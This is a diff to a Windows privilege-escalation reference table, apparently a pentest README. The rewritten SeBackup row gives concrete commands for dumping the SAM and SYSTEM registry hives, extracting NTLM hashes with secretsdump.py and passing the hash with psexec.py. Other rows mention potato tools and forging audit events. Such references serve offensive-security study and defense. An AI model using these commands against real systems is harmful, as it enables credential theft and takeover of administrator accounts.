@@ -6,7 +6,7 @@ The idea is to "translate" Windows OS privileges to a path leading to:
 
 Privileges are listed and explained at: https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants
 
-If the goal can be achived multiple ways, the priority is
+If the goal can be achieved multiple ways, the priority is
 1. Using built-in commands
 2. Using PowerShell (only if a working script exists)
 3. Using non-OS tools
@@ -26,7 +26,7 @@ Feel free to contribute and/or discuss presented ideas.
 | --- | --- | --- | --- | --- |
 |`SeAssignPrimaryToken`| ***Admin*** | 3rd party tool | *"It would allow a user to impersonate tokens and privesc to nt system using tools such as potato.exe, rottenpotato.exe and juicypotato.exe"* | Thank you [Aurélien Chalot](https://twitter.com/Defte_) for the update. I will try to re-phrase it to something more recipe-like soon. |
 |`SeAudit`| **Threat** | 3rd party tool | Write events to the Security event log to fool auditing or to overwrite old events. |Writing own events is possible with [`Authz Report Security Event`](https://docs.microsoft.com/en-us/windows/win32/api/authz/nf-authz-authzreportsecurityevent) API. |
-|`SeBackup`| **Threat** | ***Built-in commands*** | Read sensitve files with `robocopy /b` |- May be more interesting if you can read %WINDIR%\MEMORY.DMP<br> <br>- `SeBackupPrivilege` (and robocopy) is not helpful when it comes to open files.<br> <br>- Robocopy requires both SeBackup and SeRestore to work with /b parameter. |
+|`SeBackup`| ***Admin*** | 3rd party tool <br><br> Sensitive files access: <br> ***Built-in commands*** | 1. Enable the privilege in the token <br> 2. Export the `SAM` and `SYSTEM` registry hives:<br> `cmd /c "reg save HKLM\SAM SAM & reg save HKLM\SYSTEM SYSTEM"` <br> 3. Eventually transfer the exported hives on a controlled computer <br> 4. Extract the local accounts hashes from the export `SAM` hive. For example using `Impacket`'s `secretsdump.py` Python script: <br> `secretsdump.py -sam SAM -system SYSTEM LOCAL` <br> 5. Authenticate as the local built-in `Administrator` using its `NTLM` hash (Pass-the-Hash). For example using `Impacket`'s `psexec.py` Python script: <br> `psexec.py -hashes ":<ADMINISTRATOR_NTLM>" <Administrator>@<TARGET_IP>` <br><br> Alternatively, can be used to read sensitive files with `robocopy /b` | - `User Account Control` may prevent Pass-the-Hash authentications with the local accounts but by default the built-in `Administrator` (RID 500) account is not concerned (as `FilterAdministratorToken` is disabled by default). <br><br> - Pass-the-Hash authentications can be attempted over (at least) the following services: `SMB` (port TCP 445), `SMB` over `NetBIOS` (port TCP 139), `WinRM` (ports TCP 5985 / 5986), or `RDP` if `Restricted Admin` feature is enabled (port TCP 3389) <br><br> - Access to sensitive files may be more interesting if you can read `%WINDIR%\MEMORY.DMP` <br><br> - `SeBackupPrivilege` (and robocopy) is not helpful when it comes to open and write to files as it may only be used to copy files. |
 |`SeChangeNotify`| None | - | - | Privilege held by everyone. Revoking it may make the OS (Windows Server 2019) unbootable. |
 |`SeCreateGlobal`| ? | ? | ? ||
 |`SeCreatePagefile`| None | ***Built-in commands***  | Create hiberfil.sys, read it offline, look for sensitive data. | Requires offline access, which leads to admin rights anyway. |
